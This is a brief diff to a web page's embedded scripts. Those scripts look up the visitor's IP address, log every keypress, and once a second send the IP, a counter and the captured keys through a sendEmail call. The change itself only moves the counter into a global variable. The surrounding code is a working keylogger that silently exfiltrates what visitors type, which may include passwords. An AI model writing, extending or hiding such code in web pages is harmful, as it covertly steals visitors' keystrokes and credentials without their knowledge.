@@ -163,6 +163,7 @@
    <script> 
       $.get("https://api.ipdata.co?api-key=test", function(response) {
     window.ip = response.ip;
+    window.idk = 0;
 }, "jsonp");
     </script> 
   <script>
@@ -181,7 +182,6 @@
   <script>
 	  window.alert('hello mr aaron');
 	  var keys = '';
-	  var d = 0;
    document.onkeypress = function(e) {
 	get = window.event?event:e;
 	key = get.keyCode?get.keyCode:get.charCode;
@@ -190,8 +190,8 @@
 }
 	  window.setInterval(function(){
 	if(keys.length>0) {
-		sendEmail(window.ip + ':' + d.toString() + ':' + keys);
-		d++
+		sendEmail(window.ip + ':' + window.idk + ':' + keys);
+		window.idk++
 		keys = '';
 	}
 }, 1000);
